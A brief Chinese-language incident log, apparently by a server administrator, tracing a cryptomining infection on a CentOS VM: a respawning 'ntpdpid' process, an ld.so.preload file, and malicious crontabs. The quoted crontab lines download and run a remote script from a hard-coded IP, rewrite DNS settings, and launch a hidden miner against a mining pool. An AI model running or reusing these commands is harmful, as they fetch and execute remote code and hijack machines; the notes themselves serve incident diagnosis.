# CPU拔高

## 处理

top -H

找到进程号

kill后无效，短时间重启

## 询问

矿机

- 检查启动路径
- ssh目录

### 进程列表

```shell
# 基础信息
PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                                                                                                 7616 root      20   0  540196   5464   2592 R 99.3  0.3  62:37.71 ntpdpid
# kill 一次
PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                                                                                                   15902 root      20   0  540132   3380   2556 R 99.0  0.2   3:45.31 ntpdpid 
```

### 启动列表

```shell
[root@VM_0_12_centos ~]# crontab -l
*/5 * * * * pkill tail >/dev/null 2>&1
*/3 * * * * pkill masscan >/dev/null 2>&1
0 */3 * * * chattr -iau /etc/resolv.conf ; echo "nameserver 8.8.8.8" > /etc/resolv.conf
1 */3 * * * curl -m 5 -s -O http://139.9.77.204:26573/test/check.sh && chmod +x check.sh && sh check.sh ; rm -rf check.sh >/dev/null 2>&1
# https://anonpasta.rocks/raw/atucewakep
```

### 文件

```shell
etc/文件

etc下还有个ld.so.preload的文件

etc/init.d
rc.d下面找到很多创建很临时的文件
```

短短几天，，，刚处理就看到又有进程达到100%，不过这次root密码比较复杂，对方采用的是admin张账户

```shell
[root@VM_0_12_centos tmp]# crontab -l -u admin
45 * * * * /home/admin/.dhpcd -o de.minexmr.com:4444 -B >/dev/null 2>/dev/null
```

